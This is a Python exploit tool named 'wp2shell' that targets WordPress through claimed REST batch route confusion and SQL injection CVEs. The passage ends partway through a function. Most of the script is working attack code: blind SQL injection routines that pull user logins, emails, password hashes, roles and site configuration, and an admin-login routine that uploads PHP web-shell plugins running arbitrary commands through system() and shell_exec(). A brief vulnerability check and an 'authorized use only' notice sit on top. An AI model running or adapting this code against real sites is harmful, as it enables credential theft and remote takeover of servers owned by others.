#!/usr/bin/env python3
"""
wp2shell — CVE-2026-63030 + CVE-2026-60137
WordPress Pre-Auth RCE via REST Batch Route Confusion + WP_Query SQLi

Author : dinhvaren
Based on: public research by Adam Kues / Searchlight Cyber

Authorized use only. Targets must be systems you own or have explicit
written permission to test.

Features:
  check   — Detect if target is vulnerable (version + route confusion + SQLi)
  read    — Blind data extraction (users, fingerprint, config, arbitrary SQL)
"""

from __future__ import annotations

import argparse
import html.parser
import json
import os
import random
import re
import socket
import ssl
import statistics
import sys
import time

# Force UTF-8 on Windows to handle colour/banner characters
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
import csv
import io
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Callable, Optional, Tuple

# ── ANSI colour codes ───────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RST = "\033[0m"

# Neon green hacker palette
NEON_GREEN = "\033[38;5;46m"
NEON_LIME = "\033[38;5;118m"
NEON_MINT = "\033[38;5;49m"
NEON_DARK = "\033[38;5;22m"
NEON_LEAF = "\033[38;5;34m"
NEON_WHITE = "\033[38;5;255m"
NEON_GREY = "\033[38;5;240m"

GLITCH_COLORS = [NEON_GREEN, NEON_LIME, NEON_MINT, NEON_LEAF, NEON_WHITE, NEON_DARK]


def rgb_glitch(text: str, seed: int = 42) -> str:
    """Apply neon green glitch effect to each character."""
    rng = random.Random(seed)
    out = []
    for ch in text:
        if ch.strip():
            out.append(rng.choice(GLITCH_COLORS) + ch)
        else:
            out.append(ch)
    out.append(RST)
    return "".join(out)


# ── ASCII art banner ────────────────────────────────────────────
BANNER = r"""
           ██╗    ██╗██████╗ ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
           ██║    ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
           ██║ █╗ ██║██████╔╝ █████╔╝███████╗███████║█████╗  ██║     ██║
           ██║███╗██║██╔═══╝ ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
           ╚███╔███╔╝██║     ███████╗███████║██║  ██║███████╗███████╗███████╗
            ╚══╝╚══╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

     >> CVE-2026-63030 + CVE-2026-60137  |  pre-auth RCE  |  dinhvaren <<
"""  # noqa: E501


def show_banner():
    """Print neon-green hacker banner."""
    for line in BANNER.strip("\n").split("\n"):
        print(NEON_GREEN + line + RST)
    print()


# ── Output helpers ──────────────────────────────────────────────
def info(msg: str):
    print(f"  {C}[*]{RST} {msg}")


def ok(msg: str):
    print(f"  {G}[+]{RST} {msg}")


def warn(msg: str):
    print(f"  {Y}[!]{RST} {msg}")


def fail(msg: str):
    print(f"  {R}[-]{RST} {msg}")


def fatal(msg: str):
    print(f"  {R}[x] {msg}{RST}")
    sys.exit(1)


def section(title: str):
    print(f"\n  {C}{BOLD}{title}{RST}")


def result_line(label: str, value: str, vuln: bool = False):
    tag = f"{R}[VULN]{RST}" if vuln else f"{G}[OK]{RST}"
    print(f"  {tag} {label}: {value}")


# ── Safety ──────────────────────────────────────────────────────
def is_loopback(target: str) -> bool:
    host = target.split("://")[-1].split("/")[0].split(":")[0]
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        return False
    if ip in ("127.0.0.1", "::1", "0.0.0.0"):
        return True
    if ip.startswith("10.") or ip.startswith("192.168."):
        return True
    if ip.startswith("172."):
        parts = ip.split(".")
        if 16 <= int(parts[1]) <= 31:
            return True
    return False


# ── HTTP transport ──────────────────────────────────────────────
def _make_opener(proxy: Optional[str] = None) -> urllib.request.OpenerDirector:
    handlers = [urllib.request.ProxyHandler({"http": proxy, "https": proxy})] if proxy else []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers.append(urllib.request.HTTPSHandler(context=ctx))
    return urllib.request.build_opener(*handlers)


class TargetError(Exception):
    pass


@dataclass
class Response:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


class HTTPClient:
    def __init__(self, base_url: str, timeout: float = 30.0,
                 proxy: Optional[str] = None, ua: str = "", debug: bool = False):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.ua = ua or "wp2shell/1.0 (dinhvaren)"
        self._opener = _make_opener(proxy)
        self.debug = debug

    def get(self, path: str) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        return self._send(urllib.request.Request(
            url, method="GET", headers={"User-Agent": self.ua}))

    def post(self, path: str, body: dict) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        data = json.dumps(body).encode()
        return self._send(urllib.request.Request(
            url, data=data, method="POST",
            headers={"Content-Type": "application/json", "User-Agent": self.ua}))

    def _send(self, req: urllib.request.Request) -> Response:
        if self.debug:
            print(f"\n  {DIM}>>> {req.method} {req.full_url}{RST}")
            if req.data:
                body = req.data if isinstance(req.data, str) else req.data.decode("utf-8", "replace")
                print(f"  {DIM}    Body: {body[:300]}{'...' if len(body) > 300 else ''}{RST}")
        t0 = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=self.timeout)
            body = resp.read().decode("utf-8", "replace")
            if self.debug:
                print(f"  {DIM}<<< {resp.status} ({time.monotonic() - t0:.3f}s){RST}")
                print(f"  {DIM}    Body: {body[:300]}{'...' if len(body) > 300 else ''}{RST}")
            return Response(resp.status, time.monotonic() - t0, body)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            if self.debug:
                print(f"  {DIM}<<< {e.code} ({time.monotonic() - t0:.3f}s){RST}")
            return Response(e.code, time.monotonic() - t0, body)
        except OSError as e:
            raise TargetError(f"Connection failed: {e}") from None
        except Exception as e:
            raise TargetError(f"Request failed: {e}") from None


# ── Version detection ───────────────────────────────────────────
_VERSION_RE = re.compile(r"\b([0-9]+(?:\.[0-9]+){1,3})\b")


class _MetaParser(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.generators: list[str] = []

    def handle_starttag(self, tag: str, attrs: list):
        d = dict(attrs)
        if tag.lower() == "meta" and d.get("name", "").lower() == "generator":
            if d.get("content"):
                self.generators.append(d["content"])


def _extract_ver(text: str) -> Optional[str]:
    m = _VERSION_RE.search(text)
    return m.group(1) if m else None


def _is_affected(version: str) -> bool:
    try:
        parts = list(int(x) for x in version.split(".")[:3])
        while len(parts) < 3:
            parts.append(0)
        mj, mn, pt = parts
        if (mj, mn) == (6, 9) and pt <= 4:
            return True
        if (mj, mn) == (7, 0) and pt <= 1:
            return True
        if (mj, mn) == (6, 8) and pt <= 5:
            return True
        return False
    except Exception:
        return False


def detect_version(client: HTTPClient) -> dict:
    result = {"detected": False, "version": None, "source": None,
              "affected": False, "hints": []}
    seen = set()

    for path in ("/wp-json/", "/?rest_route=/"):
        try:
            resp = client.get(path)
            data = resp.json() if isinstance(resp.json(), dict) else {}
            gen = data.get("generator", "")
            if gen:
                parsed = urllib.parse.urlparse(gen)
                qs = urllib.parse.parse_qs(parsed.query)
                v = qs.get("v", [None])[0]
                if not v:
                    v = _extract_ver(gen)
                if v and (v, "rest") not in seen:
                    seen.add((v, "rest"))
                    result["hints"].append({"version": v, "source": f"REST API ({path})"})
        except Exception:
            pass

    try:
        resp = client.get("/")
        parser = _MetaParser()
        parser.feed(resp.body)
        for gen in parser.generators:
            v = _extract_ver(gen)
            if v and (v, "meta") not in seen:
                seen.add((v, "meta"))
                result["hints"].append({"version": v, "source": "HTML meta generator"})
    except Exception:
        pass

    if result["hints"]:
        result["detected"] = True
        h = result["hints"][0]
        result["version"] = h["version"]
        result["source"] = h["source"]
        result["affected"] = _is_affected(h["version"])

    return result


# ── Batch client ────────────────────────────────────────────────
_DESYNC_PRIMER = {"method": "POST", "path": "///"}
_BATCH_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")


class BatchClient:
    def __init__(self, base_url: str, timeout: float = 30.0,
                 proxy: Optional[str] = None, ua: str = "", debug: bool = False):
        self.http = HTTPClient(base_url, timeout, proxy, ua, debug=debug)
        self.requests = 0
        self._endpoint = None  # lazy-detected

    def _detect_endpoint(self) -> str:
        """Find working batch endpoint (pretty URL or rest_route fallback)."""
        # Try pretty URL first
        try:
            resp = self.http.post("/wp-json/batch/v1", {"requests": []})
            if resp.status == 207:
                return "/wp-json/batch/v1"
        except TargetError:
            pass  # server may not have batch endpoint at all
        # Fall back to rest_route
        try:
            resp2 = self.http.post("/index.php?rest_route=/batch/v1", {"requests": []})
            if resp2.status == 207:
                return "/index.php?rest_route=/batch/v1"
        except TargetError:
            pass
        # Batch endpoint not available
        raise TargetError("batch/v1 endpoint not available on this target")

    @property
    def endpoint(self) -> str:
        if self._endpoint is None:
            self._endpoint = self._detect_endpoint()
        return self._endpoint

    def post(self, payload: dict) -> Response:
        self.requests += 1
        return self.http.post(self.endpoint, payload)

    def probe(self) -> Response:
        return self.post({"requests": []})

    def marker_probe(self) -> Response:
        return self.post({
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        })

    @staticmethod
    def batch_marker_codes(response: Response) -> tuple:
        try:
            body = response.json()
        except ValueError:
            return ()
        found = []

        def walk(v):
            if isinstance(v, dict):
                c = v.get("code")
                if c in _BATCH_CODES and c not in found:
                    found.append(c)
                for child in v.values():
                    walk(child)
            elif isinstance(v, list):
                for child in v:
                    walk(child)
        walk(body)
        return tuple(found)

    @staticmethod
    def has_route_confusion(response: Response) -> bool:
        codes = BatchClient.batch_marker_codes(response)
        return all(c in codes for c in _BATCH_CODES)

    def rows(self, response: Response) -> Optional[list]:
        try:
            return response.json()["responses"][1]["body"]["responses"][1]["body"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None

    @staticmethod
    def _payload(author_not_in: str) -> dict:
        inner = {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "GET", "path": "/wp/v2/users?author_exclude="
                 + urllib.parse.quote(author_not_in, safe="")},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    def inject(self, author_not_in: str) -> Response:
        return self.post(self._payload(author_not_in))


# ── Blind SQLi ──────────────────────────────────────────────────
_MIN_PRINTABLE = 32
_MAX_PRINTABLE = 126


@dataclass
class TimingResult:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: list = field(default_factory=list)


class BlindSQLi:
    def __init__(self, client: BatchClient, sleep: float = 3.0):
        self.client = client
        self.sleep = sleep

    def _elapsed(self, sql: str) -> float:
        return self.client.inject(f"0) OR {sql}-- -").elapsed

    def confirm_timing(self, samples: int = 3) -> TimingResult:
        pairs = []
        for i in range(samples):
            b = self._elapsed("SLEEP(0)")
            d = self._elapsed(f"SLEEP({self.sleep:g})")
            pairs.append((b, d))
            info(f"Round {i+1}: baseline={b:.3f}s  delayed={d:.3f}s  delta={d-b:.3f}s")
        baselines = [p[0] for p in pairs]
        delays = [p[1] for p in pairs]
        deltas = [d - b for b, d in pairs]
        bl_m = statistics.median(baselines)
        dl_m = statistics.median(delays)
        dt_m = statistics.median(deltas)
        # Adaptive threshold: 65% of sleep or 0.5s, whichever is larger
        th = max(0.5, self.sleep * 0.5)
        return TimingResult(dt_m >= th, bl_m, dl_m, dt_m, th, samples=pairs)

    def confirm(self) -> Tuple[bool, float, float]:
        r = self.confirm_timing(samples=1)
        return r.confirmed, r.baseline, r.delayed

    def _true(self, condition: str) -> bool:
        resp = self.client.inject(f"0) AND ({condition})-- -")
        rows = self.client.rows(resp)
        return rows is not None and len(rows) > 0

    def extract(self, expression: str, max_length: int = 128,
                on_char: Optional[Callable[[str], None]] = None) -> str:
        expr = f"COALESCE(({expression}),'')"
        result = []
        for pos in range(1, max_length + 1):
            probe = f"ASCII(SUBSTRING({expr},{pos},1))"
            if not self._true(f"{probe} > 0"):
                break
            # Binary search: find exact ASCII value
            # Invariant: lo = largest value where probe > lo is TRUE
            #            hi = smallest value where probe > hi is FALSE
            # At exit: actual value = lo + 1
            lo, hi = _MIN_PRINTABLE - 1, _MAX_PRINTABLE
            while lo + 1 < hi:
                mid = (lo + hi) // 2
                if self._true(f"{probe} > {mid}"):
                    lo = mid
                else:
                    hi = mid
            result.append(chr(hi))
            if on_char:
                on_char("".join(result))
        return "".join(result)

    def integer(self, expression: str) -> int:
        text = self.extract(expression, max_length=32).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"Non-numeric result: {text!r}")
        return int(text)


# ── Commands ────────────────────────────────────────────────────
def cmd_check(target: str, args) -> dict:
    results = {"target": target, "vulnerable": False}

    section("Version detection")
    client = HTTPClient(target, timeout=args.timeout, proxy=args.proxy, ua=args.ua, debug=args.debug)
    ver = detect_version(client)
    results["version"] = ver
    if ver["detected"]:
        info(f"WordPress {ver['version']} detected via {ver['source']}")
        if ver["affected"]:
            fail(f"VERSION IN AFFECTED RANGE (CVE-2026-63030 + CVE-2026-60137)")
        else:
            ok(f"Version {ver['version']} is not in affected range — skipping confusion/SQLi checks")
            results["route_confusion"] = {"detected": False, "reason": f"Version {ver['version']} not in affected range"}
            results["sqli"] = {"confirmed": False, "reason": "Version not affected"}
            section("VERDICT")
            print(f"\n  {G}[SAFE]{RST} WordPress {ver['version']} is not in the wp2shell affected range\n")
            return results
    else:
        warn("Could not detect WordPress version")

    # Check if target is too old for batch API (added in WP 5.6)
    wp_ver = ver.get("version", "")
    try:
        parts = tuple(int(x) for x in wp_ver.split(".")[:2]) if wp_ver else ()
    except Exception:
        parts = ()
    if parts and parts < (5, 6):
        warn(f"WordPress {wp_ver} is pre-5.6 — no batch/v1 endpoint, skipping confusion/SQLi checks")
        results["route_confusion"] = {"detected": False, "reason": f"WP {wp_ver} < 5.6, no batch API"}
        results["sqli"] = {"confirmed": False, "reason": "WP too old for batch API"}
        section("VERDICT")
        print(f"\n  {G}[SAFE]{RST} WordPress {wp_ver} — too old for wp2shell (batch API added in 5.6)\n")
        return results

    section("Route confusion check")
    try:
        bc = BatchClient(target, timeout=args.timeout, proxy=args.proxy, ua=args.ua, debug=args.debug)
        ep = bc.endpoint  # may raise TargetError if batch not available
        info(f"Using batch endpoint: {ep}")
    except TargetError as e:
        fail(f"Batch endpoint unavailable: {e}")
        results["route_confusion"] = {"detected": False, "error": str(e)}
        results["sqli"] = {"confirmed": False, "reason": "Batch endpoint not reachable"}
        section("VERDICT")
        print(f"\n  {G}[SAFE]{RST} Batch API not available on this target\n")
        return results

    try:
        resp = bc.marker_probe()
        codes = bc.batch_marker_codes(resp)
        confusion = bc.has_route_confusion(resp)
        results["route_confusion"] = {
            "detected": confusion, "marker_codes": list(codes), "status": resp.status}
        if confusion:
            ok(f"Route confusion CONFIRMED (codes: {', '.join(codes)})")
        else:
            fail(f"Route confusion NOT detected (codes: {', '.join(codes) if codes else 'none'})")
    except TargetError as e:
        fail(f"Connection error: {e}")
        results["route_confusion"] = {"detected": False, "error": str(e)}

    section("SQL injection confirmation")
    if args.quick or args.sleep <= 0:
        info("Skipping SQLi confirmation (--quick / --sleep 0)")
        results["sqli"] = {"confirmed": False, "reason": "Skipped by user"}
        results["vulnerable"] = (
            results.get("version", {}).get("affected", False)
            and results.get("route_confusion", {}).get("detected", False)
        )
        section("VERDICT")
        if results["vulnerable"]:
            fail("LIKELY VULNERABLE — version affected + route confusion confirmed (SQLi skipped)")
            warn("Run without --quick to confirm full chain with --sleep 3")
        else:
            ok("Not vulnerable based on version + confusion check")
        return results

    sqli = BlindSQLi(bc, sleep=args.sleep)
    try:
        timing = sqli.confirm_timing(samples=args.rounds)
        results["sqli"] = {
            "confirmed": timing.confirmed, "baseline": timing.baseline,
            "delayed": timing.delayed, "delta": timing.delta,
            "threshold": timing.threshold}
        info(f"Baseline: {timing.baseline:.3f}s")
        info(f"Delayed : {timing.delayed:.3f}s")
        info(f"Delta   : {timing.delta:.3f}s (threshold: {timing.threshold:.3f}s)")
        if timing.confirmed:
            ok(f"BLIND SQL INJECTION CONFIRMED")
        else:
            fail(f"SQL injection NOT confirmed (delta={timing.delta:.3f}s < threshold={timing.threshold:.3f}s)")
            warn("Try: --sleep 5 --rounds 5  (increase delay and samples for noisy networks)")
    except TargetError as e:
        fail(f"Connection error: {e}")
        results["sqli"] = {"confirmed": False, "error": str(e)}

    results["vulnerable"] = (
        results.get("sqli", {}).get("confirmed", False)
        and results.get("route_confusion", {}).get("detected", False)
    )

    print()
    section("VERDICT")
    if results["vulnerable"]:
        print(f"\n  {R}{BOLD}[!!!] VULNERABLE — wp2shell chain confirmed{RST}")
        print(f"  {R}CVE-2026-63030 + CVE-2026-60137{RST}")
        print(f"  {R}Pre-auth blind SQLi -> Potential RCE{RST}")
        print(f"  {R}UPDATE to 7.0.2 / 6.9.5 / 6.8.6 IMMEDIATELY{RST}")
    else:
        print(f"\n  {G}[SAFE] Not vulnerable or could not confirm{RST}")
    print(f"  Total requests: {bc.requests}")
    print()

    return results


def cmd_read(target: str, args) -> Optional[dict]:
    # Quick pre-check: is this even WordPress?
    client = HTTPClient(target, timeout=min(args.timeout, 10), proxy=args.proxy, ua=args.ua, debug=args.debug)
    try:
        ver = detect_version(client)
        if ver["detected"]:
            info(f"WordPress {ver['version']} detected")
            if not ver["affected"]:
                warn(f"Version {ver['version']} is NOT in affected range — may still try")
        else:
            # Check if it looks like WordPress at all
            try:
                r = client.get("/")
                if "wp-content" not in r.body and "wp-includes" not in r.body:
                    fail("Target does not appear to be WordPress")
                    sys.exit(1)
            except Exception:
                fail(f"Cannot reach target — check URL and network")
                sys.exit(1)
    except TargetError as e:
        fail(f"Cannot reach target: {e}")
        sys.exit(1)

    bc = BatchClient(target, timeout=args.timeout, proxy=args.proxy, ua=args.ua, debug=args.debug)
    sqli = BlindSQLi(bc, sleep=args.sleep)
    result = {"target": target, "preset": args.preset or "query", "items": []}

    if args.no_confirm:
        section("Skipping SQLi confirmation (--no-confirm)")
    else:
        section("Confirming SQL injection channel")
        try:
            ok_flag, base, delay = sqli.confirm()
        except TargetError as e:
            fail(f"Cannot reach target: {e}")
            sys.exit(1)
        if not ok_flag:
            fail(f"SQL injection not confirmed — target may not be vulnerable or reachable")
            fail(f"Try without --no-confirm, or increase --sleep")
            sys.exit(1)
        ok(f"Channel open (baseline={base:.2f}s, delayed={delay:.2f}s)")

    if args.query:
        section(f"Extracting: {args.query}")
        def cb(s):
            print(f"\r  {C}[...]{RST} {s}", end="", flush=True)
        val = sqli.extract(args.query, max_length=args.max_length, on_char=cb)
        print(f"\r  {G}[+]{RST} Result: {G}{BOLD}{val}{RST}")
        result["items"].append({"query": args.query, "result": val})
        return result

    preset = args.preset or "fingerprint"
    result["preset"] = preset
    section(f"Running preset: {preset}")

    if preset == "fingerprint":
        for label, sql in [
            ("db_version", "VERSION()"),
            ("db_user", "CURRENT_USER()"),
            ("db_name", "DATABASE()"),
            ("hostname", "@@hostname"),
            ("datadir", "@@datadir"),
            ("server_info", "CONCAT(@@version_compile_os,' ',@@version_compile_machine)"),
        ]:
            try:
                val = sqli.extract(sql, max_length=256)
                print(f"  {G}[+]{RST} {label}: {G}{val}{RST}")
                result["items"].append({"field": label, "value": val})
            except Exception as e:
                print(f"  {R}[-]{RST} {label}: {R}{e}{RST}")

    elif preset == "users":
        info("Enumerating users...")
        try:
            count = sqli.integer("SELECT COUNT(*) FROM wp_users")
            ok(f"Found {count} user(s)")
        except Exception:
            warn("Cannot count users — trying ID=1..10")
            count = 10

        for uid in range(1, min(count + 1, 101)):
            try:
                user = sqli.extract(
                    f"SELECT user_login FROM wp_users WHERE ID={uid}", max_length=64)
                email = sqli.extract(
                    f"SELECT user_email FROM wp_users WHERE ID={uid}", max_length=128)
                pwd = sqli.extract(
                    f"SELECT user_pass FROM wp_users WHERE ID={uid}", max_length=64)
                roles = sqli.extract(
                    f"SELECT GROUP_CONCAT(meta_value) FROM wp_usermeta "
                    f"WHERE user_id={uid} AND meta_key='wp_capabilities'", max_length=512)
                print(f"\n  {G}[+]{RST} [{uid}] {G}{BOLD}{user}{RST}")
                print(f"      Email : {email}")
                print(f"      Hash  : {C}{pwd}{RST}")
                print(f"      Roles : {roles}")
                result["items"].append({
                    "id": uid, "user": user, "email": email,
                    "hash": pwd, "roles": roles,
                })
            except Exception as e:
                print(f"  {R}[-]{RST} [{uid}] {R}{e}{RST}")
                break

    elif preset == "config":
        for label, sql in [
            ("siteurl", "SELECT option_value FROM wp_options WHERE option_name='siteurl'"),
            ("home", "SELECT option_value FROM wp_options WHERE option_name='home'"),
            ("blogname", "SELECT option_value FROM wp_options WHERE option_name='blogname'"),
            ("admin_email", "SELECT option_value FROM wp_options WHERE option_name='admin_email'"),
            ("template", "SELECT option_value FROM wp_options WHERE option_name='template'"),
            ("active_plugins",
             "SELECT option_value FROM wp_options WHERE option_name='active_plugins'"),
        ]:
            try:
                val = sqli.extract(sql, max_length=2048)
                print(f"  {G}[+]{RST} {label}: {G}{val[:200]}{RST}"
                      f"{'...' if len(val) > 200 else ''}")
                result["items"].append({"field": label, "value": val})
            except Exception as e:
                print(f"  {R}[-]{RST} {label}: {R}{e}{RST}")

    return result


def cmd_shell(target: str, args) -> None:
    """Post-auth shell via admin plugin upload. Requires admin credentials."""
    if not args.password:
        fail("Need admin password: -p <password>")
        sys.exit(1)

    user = args.user
    password = args.password

    section(f"Authenticating as {user}...")

    # Shared cookie jar + redirect handler for login session
    import http.cookiejar
    cj = http.cookiejar.CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPRedirectHandler(),  # follow 302 redirects
    )

    def _sget(url: str) -> dict:
        req = urllib.request.Request(url, headers={"User-Agent": args.ua})
        try:
            r = opener.open(req, timeout=args.timeout)
            return {"status": r.status, "body": r.read().decode("utf-8", "replace"),
                    "cookies": {c.name: c.value for c in cj}}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": e.read().decode("utf-8", "replace"),
                    "cookies": {c.name: c.value for c in cj}}

    def _spost(url: str, data: bytes, ct: str = "application/x-www-form-urlencoded") -> dict:
        req = urllib.request.Request(url, data=data,
                                     headers={"User-Agent": args.ua, "Content-Type": ct})
        try:
            r = opener.open(req, timeout=args.timeout)
            return {"status": r.status, "body": r.read().decode("utf-8", "replace"),
                    "cookies": {c.name: c.value for c in cj}}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": e.read().decode("utf-8", "replace"),
                    "cookies": {c.name: c.value for c in cj}}

    # Step 1: Get login page
    try:
        resp = _sget(target + "/wp-login.php")
    except Exception as e:
        fail(f"Cannot reach login page: {e}")
        sys.exit(1)

    import re as _re
    nonce = _re.search(r'name="_wpnonce" value="([^"]+)"', resp["body"])
    nonce_val = nonce.group(1) if nonce else ""

    # Step 2: POST login
    login_data = urllib.parse.urlencode({
        "log": user, "pwd": password, "wp-submit": "Log In",
        "redirect_to": "/wp-admin/", "testcookie": "1",
    }).encode()
    try:
        result = _spost(target + "/wp-login.php", login_data)
    except Exception as e:
        fail(f"Login POST failed: {e}")
        sys.exit(1)

    cookies = {c.name: c.value for c in cj}
    has_auth = any("wordpress_logged_in" in k for k in cookies)
    if not has_auth:
        fail("Login failed — check credentials")
        sys.exit(1)

    ok(f"Logged in as {user}")

    # Get plugin upload nonce
    section("Getting upload nonce...")
    try:
        nonce_resp = _sget(target + "/wp-admin/plugin-install.php?tab=upload")
        m = _re.search(r'name="_wpnonce" value="([^"]+)"', nonce_resp["body"])
        if not m:
            m = _re.search(r'"install-plugin-nonce","([^"]+)"', nonce_resp["body"])
        if not m:
            fail("Cannot extract plugin upload nonce")
            sys.exit(1)
        upload_nonce = m.group(1)
        ok("Got upload nonce")
    except Exception as e:
        fail(f"Cannot reach plugin upload page: {e}")
        sys.exit(1)

    # Build upload helper using the same opener (shares auth cookies)
    def _upload(zip_data: bytes, filename: str) -> bool:
        import random as _r2
        boundary = "----wp2shell" + "".join(_r2.choices("0123456789abcdef", k=16))
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n{upload_nonce}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="pluginzip"; filename="{filename}.zip"\r\n'
            f"Content-Type: application/zip\r\n\r\n"
        ).encode() + zip_data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(
            f"{target}/wp-admin/update.php?action=upload-plugin",
            data=body,
            headers={"User-Agent": args.ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        try:
            r = opener.open(req, timeout=60)
            return r.status in (200, 302)
        except urllib.error.HTTPError as e:
            return e.code in (200, 302)
        except Exception:
            return False

    if args.cmd:
        section(f"Executing: {args.cmd}")
        _run_oneshot(target, args, opener, _upload)
    else:
        section("Spawning interactive shell...")
        _spawn_shell(target, args, opener, _upload)


def _http_get(url: str, ua: str = "", cookies: dict = None, timeout: float = 30) -> dict:
    """GET request returning {status, body, cookies}."""
    import http.cookiejar
    cj = http.cookiejar.CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cj),
    )
    headers = {"User-Agent": ua}
    if cookies:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        resp = opener.open(req, timeout=timeout)
        result = {"status": resp.status, "body": resp.read().decode("utf-8", "replace"),
                  "cookies": {c.name: c.value for c in cj}}
        if cookies:
            result["cookies"].update(cookies)
        return result
    except urllib.error.HTTPError as e:
        result = {"status": e.code, "body": e.read().decode("utf-8", "replace"),
                  "cookies": {c.name: c.value for c in cj}}
        if cookies:
            result["cookies"].update(cookies)
        return result


def _http_post(url: str, data: bytes, ua: str = "", cookies: dict = None,
               content_type: str = "application/x-www-form-urlencoded", timeout: float = 30) -> dict:
    """POST request returning {status, body, cookies}."""
    import http.cookiejar
    cj = http.cookiejar.CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cj),
    )
    headers = {"User-Agent": ua, "Content-Type": content_type}
    if cookies:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        resp = opener.open(req, timeout=timeout)
        result = {"status": resp.status, "body": resp.read().decode("utf-8", "replace"),
                  "cookies": {c.name: c.value for c in cj}}
        if cookies:
            result["cookies"].update(cookies)
        return result
    except urllib.error.HTTPError as e:
        result = {"status": e.code, "body": e.read().decode("utf-8", "replace"),
                  "cookies": {c.name: c.value for c in cj}}
        if cookies:
            result["cookies"].update(cookies)
        return result


def _run_oneshot(target: str, args, opener, upload_fn) -> None:
    """Upload a one-shot plugin, execute command, then delete plugin."""
    import random as _r, string as _s
    slug = "wp2shell_" + "".join(_r.choices(_s.ascii_lowercase, k=8))
    cmd = args.cmd

    plugin_code = f'''<?php
/**
 * Plugin Name: WP2Shell OneShot
 */
if (isset($_GET["token"]) && $_GET["token"] === "{slug}") {{
    system($_GET["cmd"]);
    exit;
}}
'''

    plugin_zip = _create_plugin_zip(slug, plugin_code)
    if not upload_fn(plugin_zip, slug):
        fail("Plugin upload failed")
        return

    # Execute command via direct plugin file access
    try:
        req = urllib.request.Request(
            f"{target}/wp-content/plugins/{slug}/oneshot.php?token={slug}&cmd={urllib.parse.quote(cmd)}",
            headers={"User-Agent": args.ua},
        )
        r = opener.open(req, timeout=args.timeout)
        output = r.read().decode("utf-8", "replace")
        print(f"\n  {G}{output.strip()}{RST}")
    except Exception as e:
        fail(f"Command failed: {e}")

    # Best-effort cleanup via deletion URL
    try:
        req_del = urllib.request.Request(
            f"{target}/wp-admin/plugins.php?action=delete-selected&checked%5B0%5D={slug}%2Foneshot.php",
            headers={"User-Agent": args.ua},
            method="POST",
        )
        opener.open(req_del, timeout=30)
    except Exception:
        pass


def _spawn_shell(target: str, args, opener, upload_fn) -> None:
    """Upload a mini webshell plugin and print access URL."""
    import random as _r, string as _s
    token = "".join(_r.choices(_s.ascii_letters + _s.digits, k=32))
    slug = "wp2shell_" + "".join(_r.choices(_s.ascii_lowercase, k=8))

    shell_code = f'''<?php
/**
 * Plugin Name: WP2Shell
 */
session_start();
if (!isset($_SESSION["auth"]) && isset($_GET["token"]) && $_GET["token"] === "{token}") {{
    $_SESSION["auth"] = true;
}}
if (isset($_SESSION["auth"]) && $_SESSION["auth"] === true) {{
    if (isset($_GET["cmd"])) {{
        echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
    }}
    if (isset($_POST["cmd"])) {{
        echo "<pre>" . shell_exec($_POST["cmd"]) . "</pre>";
    }}
}}
'''

    plugin_zip = _create_plugin_zip(slug, shell_code)
    if not upload_fn(plugin_zip, slug):
        fail("Plugin upload failed")
        return

    shell_url = f"{target}/wp-content/plugins/{slug}/shell.php?token={token}"
